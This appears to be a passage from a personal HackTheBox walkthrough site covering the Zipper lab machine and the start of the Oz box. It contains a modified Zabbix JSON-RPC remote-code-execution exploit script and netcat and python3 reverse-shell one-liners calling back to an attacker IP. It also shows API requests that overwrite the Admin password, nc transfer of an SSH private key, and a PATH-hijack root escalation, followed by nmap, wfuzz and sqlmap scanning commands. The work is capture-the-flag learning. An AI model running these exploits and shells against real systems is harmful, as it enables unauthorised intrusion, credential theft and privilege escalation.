\u0026quot;method\u0026quot; : \u0026quot;user.login\u0026quot;, \u0026quot;params\u0026quot;: { 'user': \u0026quot;\u0026quot;+login+\u0026quot;\u0026quot;, 'password': \u0026quot;\u0026quot;+password+\u0026quot;\u0026quot;, }, ################### # \u0026quot;auth\u0026quot; : None, \u0026quot;id\u0026quot; : 0, } headers = { 'content-type': 'application/json', } auth = requests.post(url, data=json.dumps(payload), headers=(headers)) auth = auth.json() while True: cmd = raw_input('\\033[41m[zabbix_cmd]\u0026gt;\u0026gt;: \\033[0m ') if cmd == \u0026quot;\u0026quot; : print \u0026quot;Result of last command:\u0026quot; if cmd == \u0026quot;quit\u0026quot; : break ############################### ### update payload = { \u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;script.update\u0026quot;, \u0026quot;params\u0026quot;: { \u0026quot;scriptid\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;command\u0026quot;: \u0026quot;\u0026quot;+cmd+\u0026quot;\u0026quot; }, #################################### #\t\u0026quot;auth\u0026quot; : auth['result'], \u0026quot;id\u0026quot; : 0, } cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers)) ######################## ### execute payload = { \u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;script.execute\u0026quot;, \u0026quot;params\u0026quot;: { \u0026quot;scriptid\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;hostid\u0026quot;: \u0026quot;\u0026quot;+hostid+\u0026quot;\u0026quot; }, ################################ #\t\u0026quot;auth\u0026quot; : auth['result'], \u0026quot;id\u0026quot; : 0, } cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers)) cmd_exe = cmd_exe.json() ################################### #\tprint cmd_exe[\u0026quot;result\u0026quot;][\u0026quot;value\u0026quot;] print cmd_exe  while True: ########################################### cmd = ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.14 9017 \u0026gt;/tmp/f') ######################################3#### if cmd == \u0026quot;\u0026quot; : print \u0026quot;Result of last command:\u0026quot; if cmd == \u0026quot;quit\u0026quot; : break  To get a reverse shell i just used\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.14 7001 \u0026gt;/tmp/f nc -lvnp 7001  End up in a stricted shell can\u0026rsquo;t run python i checked the paths\n/usr/bin/python, 2.7, 2, 3,  Os =version\nVERSION_ID=\u0026quot;18.04\u0026quot; [-] Hostname:da419a43ab60 eth0: inet 172.17.0.2 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:ac:11:00:02 txqueuelen 0 (Ethernet) tcp 0 0 172.17.0.2:80  DOCKER\n[+] Looks like we're in a Docker container: 12:perf_event:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 11:net_cls,net_prio:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 10:pids:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 9:cpuset:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 8:freezer:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 7:hugetlb:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 5:blkio:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 4:memory:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 3:cpu,cpuacct:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 2:devices:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 1:name=systemd:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 0::/system.slice/docker.service -rwxr-xr-x 1 root root 0 Feb 19 11:14 /.dockerenv  There are multiple connection to 172.17.0.2\n$ for ip in $(seq 1 254); do nc -zv -w 1 172.17.0.$ip 22 2\u0026gt;\u0026amp;1 \u0026gt; /tmp/nul | grep -v 'Host name lookup'|grep -v 'Connection timed out' \u0026amp; done\u0026gt; \u0026gt; da419a43ab60 [172.17.0.2] 22 (ssh) : Connection refused  aparently im in the wrong place back to zabbix lol\ntried logging into mysql as zabbix\nmysql -u Zapper -p Enter password: zapper ERROR 1045 (28000): Access denied for user 'Zapper'@'localhost' (using password: YES)  USER INFORMATION USER.CHECKAUTHENTICATION https://www.zabbix.com/documentation/3.0/manual/api/reference/user/login\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;user.checkAuthentication\u0026quot;, \u0026quot;params\u0026quot; : {\u0026quot;sessionid\u0026quot; : \u0026quot;fe104ec22e55d13c8e86cb66c93dc6f6\u0026quot;} , \u0026quot;id\u0026quot;: 1}  {\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;user.login\u0026quot;, \u0026quot;params\u0026quot;: {\u0026quot;user\u0026quot;:\u0026quot;Zapper\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;zapper\u0026quot;, \u0026quot;userData\u0026quot;:true},\u0026quot;id\u0026quot;: 1}  USER.GET\nhttps://www.zabbix.com/documentation/3.0/manual/api/reference/user/get\n{\u0026quot;userid\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;alias\u0026quot;:\u0026quot;Admin\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Zabbix\u0026quot;,\u0026quot;surname\u0026quot;:\u0026quot;Administrator\u0026quot;,\u0026quot;url\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;autologin\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;autologout\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;lang\u0026quot;:\u0026quot;en_GB\u0026quot;,\u0026quot;refresh\u0026quot;:\u0026quot;30\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;3\u0026quot;,\u0026quot;theme\u0026quot;:\u0026quot;default\u0026quot;,\u0026quot;attempt_failed\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;attempt_ip\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;attempt_clock\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;rows_per_page\u0026quot;:\u0026quot;50\u0026quot;}, ##################################################################{\u0026quot;userid\u0026quot;:\u0026quot;2\u0026quot;,\u0026quot;alias\u0026quot;:\u0026quot;guest\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;surname\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;url\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;autologin\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;autologout\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;lang\u0026quot;:\u0026quot;en_GB\u0026quot;,\u0026quot;refresh\u0026quot;:\u0026quot;30\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;theme\u0026quot;:\u0026quot;default\u0026quot;,\u0026quot;attempt_failed\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;attempt_ip\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;attempt_clock\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;rows_per_page\u0026quot;:\u0026quot;50\u0026quot;}, ##################################################################{\u0026quot;userid\u0026quot;:\u0026quot;3\u0026quot;,\u0026quot;alias\u0026quot;:\u0026quot;Zapper\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;chicken\u0026quot;,\u0026quot;surname\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;url\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;autologin\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;autologout\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;lang\u0026quot;:\u0026quot;en_GB\u0026quot;,\u0026quot;refresh\u0026quot;:\u0026quot;30\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;3\u0026quot;,\u0026quot;theme\u0026quot;:\u0026quot;default\u0026quot;,\u0026quot;attempt_failed\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;attempt_ip\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;attempt_clock\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;rows_per_page\u0026quot;:\u0026quot;50\u0026quot;  {\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;user.get\u0026quot;, \u0026quot;params\u0026quot; : {\u0026quot;output\u0026quot;:\u0026quot;extend\u0026quot;}, \u0026quot;auth\u0026quot;:\u0026quot;cf59b1d9c2addcf06b7630b3730e3d8c\u0026quot;, \u0026quot;id\u0026quot;: 1}  UPDATE SCRIPT\nthis little bit will add the script and give it an id\nhttps://www.zabbix.com/documentation/2.0/manual/appendix/api/script/update\ndidn\u0026rsquo;t get this version to work with the python3 payload but it works later on when using the script. im not sure how to escape out the error the one liner is causing.\nnetcat shell works\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;script.update\u0026quot;, \u0026quot;params\u0026quot;: {\u0026quot;hostids\u0026quot;:\u0026quot;10105\u0026quot;, \u0026quot;scriptid\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;command\u0026quot;: \u0026quot;/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.14.14\u0026quot;,9017));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);'\u0026quot;, \u0026quot;execute_on\u0026quot;: \u0026quot;1\u0026quot;}, \u0026quot;auth\u0026quot;: \u0026quot;7218f7f45344ee78c2f4c6336d715797\u0026quot; , \u0026quot;id\u0026quot;: 0}  HOSTGROUP.GET https://www.zabbix.com/documentation/3.0/manual/api/reference/hostgroup/get\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;hostgroup.get\u0026quot;, \u0026quot;params\u0026quot;: {}, \u0026quot;auth\u0026quot;:\u0026quot;03a71c71238717564bd227ea6d356130\u0026quot;, \u0026quot;id\u0026quot;: 1}  {\u0026quot;groupid\u0026quot;:\u0026quot;2\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Linux servers\u0026quot;,\u0026quot;internal\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;flags\u0026quot;:\u0026quot;0\u0026quot;}, {\u0026quot;groupid\u0026quot;:\u0026quot;4\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Zabbix servers\u0026quot;,\u0026quot;internal\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;flags\u0026quot;:\u0026quot;0\u0026quot;}]  EXECUTE SCRIPT\nthere are two scripts 1 \u0026amp; 2. 1 is ping host,conn which pings the localhost, 2 does a traceroute\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;script.execute\u0026quot;, \u0026quot;params\u0026quot;: {\u0026quot;scriptid\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;hostid\u0026quot;: \u0026quot;10106\u0026quot;}, \u0026quot;auth\u0026quot;: \u0026quot;f75aed6a9bf98e7b3057e61e13680eb1\u0026quot; , \u0026quot;id\u0026quot;: 3}  Update user\nhttps://www.zabbix.com/documentation/3.0/manual/api/reference/user/update\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;user.update\u0026quot;, \u0026quot;params\u0026quot; : {\u0026quot;userid\u0026quot;:\u0026quot;1\u0026quot;, \u0026quot;passwd\u0026quot;:\u0026quot;chickenpwny\u0026quot;} ,\u0026quot;auth\u0026quot;:\u0026quot;b6acd672e89dcc9df687144c641f2102\u0026quot;, \u0026quot;id\u0026quot;: 1  https://www.zabbix.com/documentation/3.0/manual/api/reference/user/updateprofile\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;user.updateprofile\u0026quot;, \u0026quot;params\u0026quot; : {\u0026quot;gui_access\u0026quot; : \u0026quot;0\u0026quot;} ,\u0026quot;auth\u0026quot;:\u0026quot;965527f25c3ccfb94a0aac0045a08ae1\u0026quot;, \u0026quot;id\u0026quot;: 1}  Managed to change Zapper alias to chicken\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;user.updateprofile\u0026quot;, \u0026quot;params\u0026quot; : {\u0026quot;alias\u0026quot;:\u0026quot;chicken\u0026quot;} ,\u0026quot;auth\u0026quot;:\u0026quot;fe104ec22e55d13c8e86cb66c93dc6f6\u0026quot;, \u0026quot;id\u0026quot;: 1}  Changing Admin password, changed it to chickenpwny lol. See the abose to see how i got the information to confirm this part.\nGetScripts\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;script.getscriptsbyhosts\u0026quot;, \u0026quot;params\u0026quot;: [10106], \u0026quot;auth\u0026quot; : \u0026quot;a13a74e204be089da0a4bff711cad266\u0026quot;, \u0026quot;id\u0026quot;:1}  {\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;script.get\u0026quot;, \u0026quot;params\u0026quot;: {\u0026quot;output\u0026quot;:\u0026quot;extend\u0026quot;}, \u0026quot;auth\u0026quot; : \u0026quot;2cd9441052c1eab4d63885c825766154\u0026quot;, \u0026quot;id\u0026quot;:1}  {\u0026quot;jsonrpc\u0026quot;:\u0026quot;2.0\u0026quot;,\u0026quot;result\u0026quot;:[{\u0026quot;scriptid\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Ping\u0026quot;,\u0026quot;command\u0026quot;:\u0026quot;ls\u0026quot;,\u0026quot;host_access\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;usrgrpid\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;groupid\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;description\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;confirmation\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;execute_on\u0026quot;:\u0026quot;2\u0026quot;}, {\u0026quot;scriptid\u0026quot;:\u0026quot;2\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;meow\u0026quot;,\u0026quot;command\u0026quot;:\u0026quot;rm \\/tmp\\/f;mkfifo \\/tmp\\/f;cat \\/tmp\\/f|\\/bin\\/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.14 9017 \u0026gt;\\/tmp\\/f\u0026quot;,\u0026quot;host_access\u0026quot;:\u0026quot;2\u0026quot;,\u0026quot;usrgrpid\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;groupid\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;description\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;confirmation\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;execute_on\u0026quot;:\u0026quot;1\u0026quot;}, {\u0026quot;scriptid\u0026quot;:\u0026quot;3\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Detect operating system\u0026quot;,\u0026quot;command\u0026quot;:\u0026quot;sudo \\/usr\\/bin\\/nmap -O {HOST.CONN} 2\u0026gt;\u0026amp;1\u0026quot;,\u0026quot;host_access\u0026quot;:\u0026quot;2\u0026quot;,\u0026quot;usrgrpid\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;groupid\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;description\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;confirmation\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;execute_on\u0026quot;:\u0026quot;1\u0026quot;}],\u0026quot;id\u0026quot;:1}  USERGROUP https://www.zabbix.com/documentation/3.0/manual/api/reference/usergroup\nUSERGROUP.GET {\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;usergroup.get\u0026quot;, \u0026quot;params\u0026quot;: {}, \u0026quot;auth\u0026quot;:\u0026quot;76ae2a3721c502c6bbf18b51185b6e37\u0026quot;,\u0026quot;id\u0026quot;: 3}  {\u0026quot;usrgrpid\u0026quot;:\u0026quot;7\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Zabbix administrators\u0026quot;,\u0026quot;gui_access\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;users_status\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;debug_mode\u0026quot;:\u0026quot;0\u0026quot;},{\u0026quot;usrgrpid\u0026quot;:\u0026quot;8\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Guests\u0026quot;,\u0026quot;gui_access\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;users_status\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;debug_mode\u0026quot;:\u0026quot;0\u0026quot;},{\u0026quot;usrgrpid\u0026quot;:\u0026quot;9\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Disabled\u0026quot;,\u0026quot;gui_access\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;users_status\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;debug_mode\u0026quot;:\u0026quot;0\u0026quot;},{\u0026quot;usrgrpid\u0026quot;:\u0026quot;11\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Enabled debug mode\u0026quot;,\u0026quot;gui_access\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;users_status\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;debug_mode\u0026quot;:\u0026quot;1\u0026quot;},{\u0026quot;usrgrpid\u0026quot;:\u0026quot;12\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;No access to the frontend\u0026quot;,\u0026quot;gui_access\u0026quot;:\u0026quot;2\u0026quot;,\u0026quot;users_status\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;debug_mode\u0026quot;:\u0026quot;0\u0026quot;}  USERGROUP.UPDATE\ntry updaing the usrgrpid 12 to gui access\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;usergroup.update\u0026quot;, \u0026quot;params\u0026quot;: {\u0026quot;usrgrpid\u0026quot;:\u0026quot;12\u0026quot;, \u0026quot;gui_access\u0026quot;:\u0026quot;0\u0026quot;}, \u0026quot;auth\u0026quot;:\u0026quot;76ae2a3721c502c6bbf18b51185b6e37\u0026quot;,\u0026quot;id\u0026quot;: 1}  the multiple cookies are from me messing with the cookies using an addon lol\nINTERFACE.get\nTo get information about the interface icluding the hostid.\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;hostinterface.get\u0026quot;, \u0026quot;params\u0026quot;: {\u0026quot;interaceids\u0026quot;:\u0026quot;\u0026quot;}, \u0026quot;auth\u0026quot;:\u0026quot;76ae2a3721c502c6bbf18b51185b6e37\u0026quot;,\u0026quot;id\u0026quot;: 3}  {\u0026quot;interfaceid\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;hostid\u0026quot;:\u0026quot;10105\u0026quot;,\u0026quot;main\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;useip\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;ip\u0026quot;:\u0026quot;127.0.0.1\u0026quot;,\u0026quot;dns\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;port\u0026quot;:\u0026quot;10050\u0026quot;,\u0026quot;bulk\u0026quot;:\u0026quot;1\u0026quot;}, {\u0026quot;interfaceid\u0026quot;:\u0026quot;2\u0026quot;,\u0026quot;hostid\u0026quot;:\u0026quot;10106\u0026quot;,\u0026quot;main\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;useip\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;ip\u0026quot;:\u0026quot;172.17.0.1\u0026quot;,\u0026quot;dns\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;port\u0026quot;:\u0026quot;10050\u0026quot;,\u0026quot;bulk\u0026quot;:\u0026quot;1\u0026quot;}  You can also get a shell using the webportal. change execute on to zabbix server.\nPYTHON\nneed to use the full path /usr/bin/python3\n/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.14.14\u0026quot;,9038));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);'  Upgrading the TTY\n/usr/bin/python3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)'  yeah finally on the right host\n#!/bin/bash # # Quick script to backup all utilities in this folder to /backups # /usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* \u0026amp;\u0026gt;/dev/null echo $?$  $? is the return code from the last run process. 0 means no error happened. Other values represent some kind of unusual condition. The password has a special character in that can\u0026rsquo;t be coppied over. so cat the file can copy the passowrd and su into the user.\n-p set password ZippityDodah -a add file to archive  REVIEWING 39937.PY\nSo, after some learning I went back and edited the binary to execute on the zabbix server instead of the agent landing me on the correct host. changed the hostid to 10106.\n#!/usr/bin/env python # -*- coding: utf-8 -*- # Exploit Title: Zabbix RCE with API JSON-RPC # Date: 06-06-2016 # Exploit Author: Alexander Gurin # Vendor Homepage: http://www.zabbix.com # Software Link: http://www.zabbix.com/download.php # Version: 2.2 - 3.0.3 # Tested on: Linux (Debian, CentOS) # CVE : N/A import requests import json import readline ZABIX_ROOT = 'http://10.10.10.108' ### Zabbix IP-address url = ZABIX_ROOT + '/zabbix/api_jsonrpc.php' ### Don't edit login = 'Zapper' ### Zabbix login password = 'zapper' ### Zabbix password hostid = '10106' ### Zabbix hostid ### auth payload = { \u0026quot;jsonrpc\u0026quot; : \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot; : \u0026quot;user.login\u0026quot;, \u0026quot;params\u0026quot;: { 'user': \u0026quot;\u0026quot;+login+\u0026quot;\u0026quot;, 'password': \u0026quot;\u0026quot;+password+\u0026quot;\u0026quot;, }, \u0026quot;auth\u0026quot; : None, \u0026quot;id\u0026quot; : 0, } headers = { 'content-type': 'application/json', } auth = requests.post(url, data=json.dumps(payload), headers=(headers)) auth = auth.json() while True: cmd = raw_input('\\033[41m[zabbix_cmd]\u0026gt;\u0026gt;: \\033[0m ') if cmd == \u0026quot;\u0026quot; : print \u0026quot;Result of last command:\u0026quot; if cmd == \u0026quot;quit\u0026quot; : break ### update payload = { \u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;script.update\u0026quot;, \u0026quot;params\u0026quot;: { \u0026quot;host_access\u0026quot;:\u0026quot;1\u0026quot;, #### \u0026quot;groupid\u0026quot;:\u0026quot;0\u0026quot;,\t##### \u0026quot;scriptid\u0026quot;: \u0026quot;1\u0026quot;,\t###### \u0026quot;type\u0026quot;: \u0026quot;0\u0026quot;,\t##### \u0026quot;execute_on\u0026quot;:\u0026quot;1\u0026quot;,\t#####@######################### \u0026quot;command\u0026quot;: \u0026quot;\u0026quot;+cmd+\u0026quot;\u0026quot; }, \u0026quot;auth\u0026quot; : auth['result'], \u0026quot;id\u0026quot; : 0, } cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers)) ### execute payload = { \u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;script.execute\u0026quot;, \u0026quot;params\u0026quot;: { \u0026quot;scriptid\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;hostid\u0026quot;: \u0026quot;\u0026quot;+hostid+\u0026quot;\u0026quot; }, \u0026quot;auth\u0026quot; : auth['result'], \u0026quot;id\u0026quot; : 0, } cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers)) cmd_exe = cmd_exe.json() print cmd_exe[\u0026quot;result\u0026quot;][\u0026quot;value\u0026quot;]  So i tried logging back and could not do it for the lfie of me. This will be more detailed to avoid missing anything steps.\nYou may create a script or update a script. First login using the api get the sessionid and use that for authentication. Use hostinterface.get and review the host :10105, :10106. Next change the Admin password to WatchIppsec. Go to scripts and edit detect operating system to reflect below.\nYou may also change zappers privledges but this is much simpler. should be above somewhere.\nPYTHON3\nIf you dont use python3 the shell will be closed after the first command is entered or in five seconds. you can navigate the directories and it doesn\u0026rsquo;t hinder anything. It got annoying and i needed to get a real shell to use su to escalate to zapper. May need to run two nc listeners and chain the shells to get a stable connection.\n /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.14.14\u0026quot;,9017));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);'  PYTHON PTY\n/usr/bin/python3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash/\u0026quot;)'  SU ZAPPER COPY PASTE THE PASSWORD FROM THE FILE IT HAS A SPECIAL CHARACTER\nROOT you can copy over id_rsa and login as zapper with a ssh_key. I used nc to trans over the files\nnc -lp 9018 \u0026gt; id_rsa nc -w 3 10.10.14.14 9018 \u0026lt; id_rsa chmod 600 id_rsa ssh zapper@10.10.10.108 -i id_rsa  This method is on the oscp. Seems pretty common when it comes to linux privledge escalation. I have never bumped into it. Most programs will uses the closest exeternal references. If the external call for say a library module or some kind of system command; it will uses the closest one. lets say the script is using cat to read the output of a file. The binary uses cat but if if a malicious cat binary was placed in the local directory it will use that one before /bin/cat. this is a built in thing with some programing languages like python suffer from libary hijacking.\nusing strings or ltrace youll notice the program uses the system command systemctl. Thats what well being takin advantage of to get root.\nLTRACE cd /home/zapper/utils echo \u0026quot;/bin/bash\u0026quot; \u0026gt; systemctl chmod 777 systemctl echo $PATH export PATH=/home/zapper/utils:$PATH ./zabbix-service  clean up the path changes be careful chaning this\nPATH=$(echo \u0026quot;$PATH\u0026quot; | sed -e 's/:\\/home\\/zapper\\/utils$//')  SOURCE CODE FOR ZABBIX SERVICES\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; const char *opt = NULL; //compile: gcc -o zabbix-service zabbix-service.c //copy: cp zabbix-service /home/zapper/utils/zabbix-service //suid: chmod a+s /home/zapper/utils/zabbix-service int main(int argc, const char **argv) { setuid(0); setgid(0); if (argc == 1) { // no argument was passed in, get input char input[10]; printf( \u0026quot;start or stop?: \u0026quot; ); fgets(input, sizeof(input), stdin); input[strcspn(input, \u0026quot;\\n\u0026quot;)] = 0; opt = input; } else { opt = argv[1]; } if (strcmp(opt, \u0026quot;start\u0026quot;) == 0) { ########################################################## never mind it does not use full paths lol ######################################################## system(\u0026quot;systemctl daemon-reload \u0026amp;\u0026amp; systemctl start zabbix-agent\u0026quot;); } else if (strcmp(opt, \u0026quot;stop\u0026quot;) == 0) { system(\u0026quot;systemctl stop zabbix-agent\u0026quot;); } else { printf(\u0026quot;[!] ERROR: Unrecognized Option\\n\u0026quot;); return 1; } return 0; }  "
},
{
	"uri": "/hackthebox/boxes/oz/",
	"title": "oz",
	"tags": [],
	"description": "",
	"content": " {{ button href=\u0026ldquo;https://www.youtube.com/watch?v=yX00n1UmalE\u0026quot; theme=danger }} IppSec {{ /button }}\nNMAP\ntwo ports 80 \u0026amp; 8080\nnmap -sC -sV -oA nmap/oz-initial 10.10.10.96 -T4 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-20 11:18 EST Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 0.00% done Nmap scan report for 10.10.10.96 Host is up (0.041s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Werkzeug httpd 0.14.1 (Python 2.7.14) |_http-server-header: Werkzeug/0.14.1 Python/2.7.14 |_http-title: OZ webapi |_http-trane-info: Problem with XML parsing of /evox/about 8080/tcp open http Werkzeug httpd 0.14.1 (Python 2.7.14) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Werkzeug/0.14.1 Python/2.7.14 | http-title: GBR Support - Login |_Requested resource was http://10.10.10.96:8080/login modify the host header  host: please subscribe.\ngobuster using the -l switch will filter out matching lengths.\nusing options in the request method in burp will give you the supported request. neat\nUsing wfuzz to enumerate the webapi filter header lengths of 0\nwfuzz --hl 0 -u http://oz.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-lis t-2.3-medium.txt returns 000202: C=200 3 L 6 W 79 Ch \u0026quot;users\u0026quot;  sqlmap \u0026ndash;batch -u \u0026ldquo;http://os.htb/users/admin*\u0026quot; 